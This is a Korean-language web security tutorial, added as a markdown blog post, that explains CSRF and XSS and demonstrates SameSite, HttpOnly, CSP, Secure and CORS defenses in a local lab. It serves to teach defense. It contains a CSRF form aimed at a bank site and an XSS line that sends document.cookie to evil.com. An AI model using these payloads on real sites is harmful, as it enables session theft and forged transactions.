@@ -1,0 +1,315 @@
+---
+title: "민감 정보를 담은 쿠키를 안전하게 보호하자! - CSRF, XSS 방어 실습"
+publishedAt: "2025-09-25"
+summary: "쿠키를 안전하게 보호하기 위해 브라우저 레벨부터 서버 속성까지 다양한 방법을 실습해보기"
+---
+
+## 🍪 웹 브라우저에 저장되는 쿠키
+
+로그인을 진행하면서 세션-쿠키 방식으로 구현했다.
+이때 세션ID를 브라우저의 쿠키에 저장하게 되고, 브라우저와 서버는 쿠키 정보를 주고받는다.
+
+쿠키를 저장하는 공간을 전통적으로 쿠키 통(COOKIE_JAR)라고 부른다.
+브라우저는 헤더로 Set-Cookie를 받으면 COOKIE_JAR를 업데이트 해야한다.
+
+### 쿠키의 특징
+
+- 쿠키는 브라우저의 신원으로, 같은 도메인에서 동일한 쿠키가 사용된다. 그래서 동일한 쿠키를 사용하면 동일한 사용자라고 인식한다. 이는 보안 측면에서 문제가 될 수 있다.
+- 같은 도메인 내에서는 **모든 API 요청에 자동으로 세션 쿠키가 포함**된다. 이는 개인 프라이빗 데이터가 유출되는 것이다. 공격자가 서버나 브라우저를 이용해 쿠키를 탈취할 가능성이 있다.
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/d72e210c-b4f5-40df-afce-24e4aa0f07a1/image.png)
+
+위 이미지에서 확인할 수 있듯이 naver.com, search.naver.com, shopsquare.naver.com 등 각 도메인별로 쿠키가 분류되어 저장되어 있다.
+
+### 쿠키의 한계
+
+이렇게 **보안 기능이 따로 없는 쿠키를 위해 실무적으로 방어**를 해줘야한다.
+
+- 브라우저 레벨: SOP(기본), CORS 정책 적절 설정
+- 쿠키 옵션: `HttpOnly`, `Secure`, `SameSite`
+- 서버 쪽: CSRF 토큰, Origin/Referer 검사, 출력 이스케이프, CSP로 XSS 차단
+
+이런 방어 체계에 대한 이해를 더욱 돕기 위해 해커가 만든 웹사이트인 evil.com와 은행 웹사이트인 bank.com 을 예시로 들어 설명하겠다.
+
+## 1️⃣ 동일 출처 정책(SOP, Same-Origin Policy)
+
+일단 감사하게도, 브라우저 레벨에서 동일 출처 정책(SOP) 기능이 장착되어있다.
+서버가 Set-Cookie로 세션을 내려주면 브라우저가 동일 출처로 자동 저장·전송한다.
+**동일 출처란 같은 origin, 같은 호스트명, 같은 포트**를 가진 웹페이지에만 전송을 허용하는 것이다.
+
+### 왜 SOP가 중요하냐면
+
+- SOP는 **다른 출처(교차 출처)의 스크립트가 해당 응답을 읽지(Read) 못하게** 막는다.
+- 공격자 페이지에서 요청을 보내는 것 자체는 (브라우저가 허용하면) 가능하더라도, **응답을 읽어 처리하는 단계**를 차단함으로써 **데이터 유출을 막는다.**
+- 이 방법으로, 웹사이트의 프라이빗 데이터가 그 웹사이트에만 유지되고 다른 서버의 공격자에게 유출되지 않을 수 있다.
+- A가 자바스크립트 코드(fetch, axios 등)로 B에게 서버 요청을 보낸 뒤, 그 결과 데이터(응답)을 자신의 스크립트 변수에 담아 읽어오는 것을 차단하는 것이다.
+
+만약 해커가 만든 evil.com에서 은행인 bank.com의 계좌 정보 API를 자바스크립트 fetch로 몰래 읽어가려고 하는 상황을 생각해보겠다.
+
+위에서 말했듯이 브라우저 레벨에서 SOP가 장착되어있다.
+브라우저는 bank.com에 다녀오긴 하지만, SOP 규칙 때문에 해커에게 대답을 알려주지 않고 에러를 뱉는다. (데이터 유출 차단)
+
+### SOP가 못막는 것 - CSRF 공격
+
+SOP는 자바스크립트(fetch 등)의 응답 읽기를 막지만, 이런 SOP가 막지 못하는 게 있다.
+
+브라우저의 기본 HTML 태그(`<form>`, `<img>`, `<a href>`)를 통한 요청 자체는 막지 않는다.
+따라서 폼 전송과 같은 **교차 사이트 요청 위조(CSRF) 공격**을 가능하게 한다. 즉, 공격자가 사용자의 브라우저로 요청을 보내게 해서 쿠키는 자동으로 포함될 수 있는 것이다.
+
+위에서 말했듯이 쿠키는 같은 도메인에서 동일한 쿠키가 사용되는데,
+여기서 중요한 점은 쿠키가 포함되는 기준이 "발신한 페이지가 어디인가"가 아니라 "**수신 페이지가 어디인가**" 라는 것이다.
+
+예를 들어, 이를 악용하는 위해 공격자가 evil.com 페이지를 하나 만들고,
+요청의 목적지가 bank.com 이기만 하면 브라우저는 bank.com 의 **쿠키를 자동으로 포함**하게 된다.
+
+```html
+<!-- 공격자가 만든 evil.com 페이지 -->
+<form action="https://bank.com/add" method="POST">
+  <input name="amount" />
+  <button>OK</button>
+</form>
+```
+
+1. 해커가 악의적인 사이트(evil.com)에 위 코드를 숨겨두었다.
+2. 브라우저: "사용자가 버튼을 클릭하면, bank.com 주소로 요청 보내야지? 어, 나한테 bank.com 로그인 쿠키가 있는데? 같이 보내줘야지!"
+3. 은행 서버: "어, 누군가 송금 API를 호출했네? 로그인 증명서(쿠키)도 잘 들어있고 잔액도 충분하네. 오케이, 해커 계좌로 1만 원을 송금하고 결과값으로 `{"status": "success"}`를 돌려보내 줘야겠다!"
+4. 브라우저는 은행 서버가 돌려준 `{"status": "success"}`라는 텍스트 응답을 받는다.
+5. 하지만 응답과 상관없이 은행 서버에서는 이미 송금 처리가 완벽하게 끝난 것이다.
+
+이러한 공격을 **CSRF(Cross-Site Request Forgery, 사이트 간 요청 위조)공격**이라고 한다.
+
+## 2️⃣ CSRF 방어
+
+이처럼 SOP의 한계로 인해 **CSRF 방어(토큰, SameSite 등)** 가 필요하다.
+
+폼 전송을 위한 안전한 솔루션은 **SameSite** 쿠키이다.
+만약 서버가 자신의 쿠키를 SameSite로 설정해두면, 브라우저는 폼 전송이 교차 차이트일 때 그 쿠키를 전송하지 않는다.
+
+- Set-Cookie: SameSite=Lax
+- SameSite 속성은 Lax, Strict, None 3가지이다.
+
+| 속성       | 교차 사이트 GET 요청 (링크 클릭 등)                  | 교차 사이트 POST / AJAX / iframe 등 | 동일 사이트 GET/POST 요청 | 특징 / 주의점                                                                                                                                                      |
+| ---------- | ---------------------------------------------------- | ----------------------------------- | ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **None**   | ✅ 쿠키 전송                                         | ✅ 쿠키 전송                        | ✅ 쿠키 전송              | 교차 사이트 요청에도 항상 쿠키 전송. 반드시 `Secure`와 함께 사용해야 하고 CSRF 방어(토큰, Origin 검증 등) 필요. <br />외부 연동(소셜 로그인, 결제 콜백 등) 시 사용 |
+| **Lax**    | ✅ 쿠키 전송 (탑레벨 내비게이션의 안전한 GET은 허용) | ❌ 쿠키 전송 안 함                  | ✅ 쿠키 전송              | 기본값. 일반적인 사용성(링크 통한 로그인 유지)과 보안을 균형 있게 지원                                                                                             |
+| **Strict** | ❌ 쿠키 전송 안 함                                   | ❌ 쿠키 전송 안 함                  | ✅ 쿠키 전송              | 가장 보안 강력. 교차 사이트에서 들어오는 모든 요청에 쿠키 차단 → 외부 리디렉션(OAuth, 결제) 깨질 수 있음                                                           |
+
+각 속성마다 어떻게 보안이 달라지는 지 실습해보자.
+
+### 실습 환경
+
+1. bank.com (Target Server): https://localhost:3100 에서 돌아가며, 사용자의 계정(세션)과 돈을 관리한다.
+2. evil.com (Attacker Server): http://localhost:3101 에서 돌아가며, bank.com을 향해 악의적인 요청(CSRF)을 보낸다.
+
+### [실습1] `SameSite=None` 일 때 - CSRF 공격 성공
+
+현재 대부분의 브라우저는 기본적으로 SameSite를 생략하면 Lax가 기본 적용되기 때문에,
+CSRF를 실습하려면 명시적으로 None을 설정해야 한다.
+
+```
+res.cookie('sessionId', sid, path: '/', secure, sameSite = 'none');
+```
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/8c1da7be-2950-4690-979b-93aa4b91997c/image.png)
+
+![practice1](/images/posts/4-javascript/1-2.gif)
+
+1. bank.com 에 접속한다.
+2. SameSite=None 속성으로 로그인 버튼을 누른다.
+3. 로그인된 상태에서 브라우저의 새 탭을 열고 evil.com에 접속한다.
+4. 화면에 3초 대기 안내가 나온다.
+5. 3초 후, 자동으로 폼이 제출되면서 https://localhost:3100/transfer 주소로 이동하게 된다.
+
+- **결과**: Attacker에게 송금이 성공한다. (CSRF 공격 성공)
+- **이유**: 위에서 언급했던 것처럼 SameSite=None이므로 다른 도메인(evil.com)에서 폼을 제출해도 기본적으로 브라우저가 bank.com의 세션 쿠키를 함께 전송하기 때문이다.
+
+### [실습2] `SameSite=Lax` 일 때 - CSRF 방어 성공
+
+```
+res.cookie('sessionId', sid, path: '/', sameSite = 'lax');
+```
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/9ff00a93-55d9-41bd-ae2a-f64045170101/image.png)
+
+![practice2](/images/posts/4-javascript/1-3.gif)
+
+1. bank.com 에 접속한다.
+2. SameSite=Lax 속성으로 로그인 버튼을 누른다.
+3. 로그인된 상태에서 브라우저의 새 탭을 열고 evil.com에 접속한다.
+4. 화면에 3초 대기 안내가 나온다.
+5. 3초 후, 송금이 실패하고, 인증되지 않은 요청이라는 에러가 뜬다.
+
+- **이유**: SameSite=Lax는 **POST** 같은 상태 변경(악성 폼 제출) 시 Cross-Site 요청에 쿠키를 포함시키지 않는다. 따라서 bank.com 서버에는 sessionId **쿠키가 전달되지 않아 요청이 거부**된다.
+- **한계**: 위험해보이는 POST 요청은 막아주지만, 안전하다고 여겨지는 일부 **GET** 요청에는 쿠키를 실어준다. 따라서 서버는 정상적인 쿠키가 들어왔으니 **송금해버린다.**
+- **결론**: 이 맹점 때문에 **DB의 상태를 변경하는 작업(INSERT, UPDATE, DELETE)은 절대로 GET 방식으로 설계하면 안 된다.** REST API 원칙에서 GET은 오직 조회(Read) 전용으로만 쓰라고 강조하는 이유이다.
+
+### [실습3] `SameSite=Strict` 일 때 - 더욱 강력한 보안
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/c962e87c-66f8-4d38-88b0-bcd7ef6e65d7/image.png)
+
+![practice3](/images/posts/4-javascript/1-4.gif)
+
+1. SameSite=Strict 속성으로 로그인 버튼을 누른다.
+2. 로그인된 상태에서 브라우저의 새 탭을 열고 evil.com에 접속한다.
+3. evil.com 하단의 GET 요청 (링크)을 클릭한다.
+4. 로그인이 풀린 화면으로 이동한다.
+
+- **이유**: Strict 정책은 `<form>` 뿐만 아니라 일반적인 링크(`<a href>`) 클릭으로 타 사이트에서 진입할 때도 쿠키를 전송하지 않기 때문이다.
+- **한계**: 보안 측면만 본다면 Strict 설정이 완벽한 방패가 맞다. 하지만 왜 브라우저 기본 설정은 Lax일까?
+  - "사용성(UX)"과 "외부 연동"에서 문제들이 발생하기 때문에 모든 서비스에 무조건 Strict를 걸어둘 수는 없다. (교차 사이트 GET 요청)
+  - 외부 링크를 타고 들어올 때마다 "로그아웃" 처리됨
+  - OAuth(소셜 로그인) 및 결제 시스템(PG) 연동 오류 발생
+- **결론**: 이러한 이유로 **브라우저는 보안과 사용성의 밸런스를 맞춘 Lax를 기본값으로 채택**한 것이다.
+  - 보통의 로그인 세션에는 Lax를 사용하고, 정말 1원도 뚫리면 안 되는 아주 민감한 특정 트랜잭션 쿠키에 대해서만 제한적으로 Strict를 활용하는 방식으로 설계하도록 한다.
+
+## 3️⃣ XSS 공격의 방어막
+
+지금까지 진행한 CSRF 방어(SameSite)는 **"해커의 사이트(evil.com)에서 보내는 요청"** 을 막는 역할만 할 뿐, 해커가 **"쿠키 자체를 훔쳐가는 것"** 을 막지는 못한다.
+
+bank.com에 로그인한 상태에서, 개발자 도구의 Console에 `document.cookie` 입력해보자.
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/85e07ff9-6879-48ec-90d8-a5a5361ffaf0/image.png)
+
+sessionId 값이 그대로 출력된다. 이처럼 자바스크립트에서 접근이 가능하다.
+
+document.cookie 로 sessionId 를 읽을 수 있다는 것은, 만약 bank.com 페이지에서 아래와 같은 악성 스크립트 코드로 유저의 세션 쿠키를 통째로 훔쳐갈 수 있다.
+
+```
+<script> fetch('http://evil.com/steal?cookie=' + document.cookie) </script>
+```
+
+이러한 공격을 **XSS(Cross-Site Scripting)** 라고 한다.
+
+물론, XSS 공격이 성공하려면 bank.com 자체에 XSS 취약점(입력값 미처리 등)이 있어야 한다.
+
+XSS 공격의 상황 예시는 다음과 같다.
+
+해커가 게시판 댓글이나 프로필 이름 등에 `<script>해킹코드</script>` 같은 자바스크립트 태그를 몰래 적어두고, 다른 사용자가 그 글을 읽을 때 브라우저가 실행해야 할 코드로 착각하고 실행해버린다.
+
+따라서 XSS 방어의 1차 책임은 입력값 **sanitize**에 있다. 서버와 프론트엔드에서 우선적으로 처리해줘야 한다.
+
+여기서 **HttpOnly** 설정을 해주는 것은 XSS가 발생하더라도, 쿠키만큼은 탈취되지 않도록 하는 2차 방어선이라고 할 수 있다.
+
+### HttpOnly
+
+HttpOnly 설정을 해주면 **브라우저 내부에서만 사용**하도록 하고 **JS 코드에서 접근 불가**하다.
+
+Set-Cookie 에 HttpOnly 를 추가해본다.
+
+```
+res.cookie('sessionId', sid, path: '/', sameSite = 'lax', httpOnly: true);
+```
+
+개발자 도구에서 Cookie 를 확인해보자.
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/dd98d94f-eea9-4e6c-a4d1-749e29994423/image.png)
+HttpOnly 에 체크가 되어 있다.
+
+이제 Console 에서 다시 document.cookie 를 입력해보자.
+
+![](https://velog.velcdn.com/images/dyeon-dev/post/05843920-137e-4f82-a173-85086dee556a/image.png)
+
+빈 문자열이 반환된다. JavaScript 에서 Cookie 에 접근할 수 없게 된 것이다.
+
+Browser 는 여전히 요청 시 Cookie 를 자동으로 포함하지만, 스크립트를 통한 탈취 경로는 차단되었다.
+
+### 콘텐츠 보안 정책 (CSP, Content-Security-Policy)
+
+XSS 공격의 방어막 중 HttpOnly 이외에도 Content-Security-Policy(CSP) 헤더가 있다.
+이 헤더의 전체 사양은 복잡하지만, 가장 단순한 예시는 default-src 키워드 뒤에 공백으로 구분된 서버 목록을 설정하는 것이다.
+
+서버가 브라우저에게 미리 **화이트리스트**를 주고, 여기서는 **우리 도메인에서 주는 자바스크립트만 실행하라고 CSP 헤더 규칙을 지정**한다.
+
+```
+Content-Security-Policy: default-src 'self'
+```
+
+이렇게 하면 브라우저에게 리스트된 출처를 제외한 CSS, JS, 이미지 등 **모든 스크립트와 리소스를 로드하지 말라고 요청**한다.
+
+애초에 악성 코드가 실행되는 것 자체를 미리 막아주기 때문에 **훨씬 광범위하고 강력한 방어막**이다.
+
+> **[참고] 실무에서의 디테일 설정** <br />
+> 만약 "자바스크립트는 우리 도메인에서만 가져가고(self), 이미지는 AWS S3나 네이버 등 아무 곳에서나 허용하고 싶다"면 아래처럼 기능별로 쪼개서 설정하게 된다. <br />
+> `Content-Security-Policy: default-src 'self'; img-src \*;`
+
+## 4️⃣ Secure - HTTPS 전용 전송
+
+Secure는 Cookie 값을 암호화하는 옵션이 아니다.
+대신 **Cookie를 HTTPS 요청에서만 보내도록 Browser에게 알려주는 설정**이라고 할 수 있다.
+
+```
+res.cookie('sessionId', sid, path: '/', secure);
+```
+
+Server 가 Set-Cookie로 이 설정을 내려주면, Browser는 요청을 보낼 때마다
+주소가 http 인지 https 인지 보고 Cookie 포함 여부를 자동으로 판단한다.
+
+그래서 같은 사용자, 같은 경로 요청이라도 전송 결과가 달라진다.
+
+```
+GET /mypage HTTP/1.1
+Host: localhost:3100
+Cookie: sessionId=abc123
+```
+
+HTTPS 요청일 때만 위처럼 Cookie 가 포함되고,
+
+```
+GET /mypage HTTP/1.1
+Host: localhost:3100
+```
+
+HTTP 요청에서는 Cookie 헤더가 빠지게 된다.
+
+즉, 암호화되지 않은 HTTP 구간에서는 sessionId 가 그대로 드러나는 상황을 줄일 수 있다.
+
+## 5️⃣ CORS는 왜 설정해줘야할까?
+
+브라우저 레벨에서 **CORS(Cross-Origin Resource Sharing, 교차 출처 리소스 공유) 설정을 한다는 건 서버 API를 호출할 수 있는 Whitelist를 엄격하게 관리**하라는 뜻이다.
+
+위에서 말했다시피, 기본적으로 브라우저에 SOP가 적용이 되어있기 때문에 다른 출처에서는 내 서버로 접근하지 못한다.
+
+여기서 문제는 현대적인 웹 서비스에서는 프론트엔드(ex. localhost:3000)와 백엔드(ex. localhost:8080)의 출처가 다르다는 점이다. 이때 브라우저의 SOP 방패를 뚫고 "이 사이트는 우리가 믿는 사이트니까 열어줘!" 라고 서버가 브라우저에게 알려주는 헤더 정보가 바로 **CORS**이다.
+
+하지만 가장 큰 참사는 개발 편의성을 위해 서버 쪽에 CORS를 모두 허용(\*)으로 해둬서 뚫리는 경우이다.
+
+```
+// 🚨 최악의 보안: CORS 전면 개방
+res.setHeader('Access-Control-Allow-Origin', '*');
+```
+
+이렇게 해두면 아까 브라우저가 기본적으로 막아두던 SOP 방패가 완전히 무력화된다..! 따라서 CORS 정책의 적절한 방어 설정을 해줘야 한다.
+
+```
+// ✅ 튼튼한 방어: 내가 신뢰하는 도메인만 허용
+res.setHeader('Access-Control-Allow-Origin', 'https://프론트엔드사이트.com');
+```
+
+이처럼 프론트엔드 주소(신뢰할 수 있는 출처)만 명시적으로 콕 집어서 허용해 줘야한다. 이렇게 해야 해커의 사이트에서 비정상적으로 자바스크립트를 통해 우리 서버의 데이터를 빼가는 것을 브라우저 단에서 안전하게 차단할 수 있다.
+
+### 실제 프로젝트 적용
+
+실제 프로젝트를 진행하다보면, 필수적으로 CORS 설정을 해줘야 한다.
+
+#### Whitelist 방식 origin
+
+믿을 수 있는 프론트엔드 도메인 3개만 배열로 허용해주었다.
+[CORS 설정 커밋→](https://github.com/boostcampwm2025/web30-TADAK/pull/166/changes/a350ae4862a005f98a2b12be7a27a52c07d911f0#diff-32c5294dd7ca131397ef57a87c3e0cf38ea5c2e4ca0061c602e73f7f00514c1aR16-R17)
+
+```
+  app.enableCors({
+    origin: ['http://localhost:5173', 'https://www.tadak.site', 'https://tadak.site'],
+    credentials: true,
+  });
+```
+
+- http://localhost:5173: 로컬 프론트엔드 개발용
+- https://www.tadak.site, https://tadak.site: 실제 운영 중인 라이브 서비스용
+
+이렇게 하면 이 세 곳을 제외한 어떠한 사이트에서도 브라우저를 통해 이 서버의 API 데이터를 몰래 읽어갈 수 없다.
+
+#### 쿠키 전송을 위한 credentials: true
+
+백엔드와 프론트엔드의 주소(도메인/포트)가 서로 다를 때, 발급받았던 세션 ID 같은 인증 쿠키를 API 요청에 담아 주고받으려면 프론트엔드의 `withCredentials`와 함께 백엔드에도 반드시 이 `credentials: true` 옵션이 필요하다.
+
+특히 브라우저 보안 스펙상 `credentials: true`를 사용할 때는 절대 origin: '\*'을 설정할 수 없도록 아예 문법적으로 강력하게 막혀 있다.
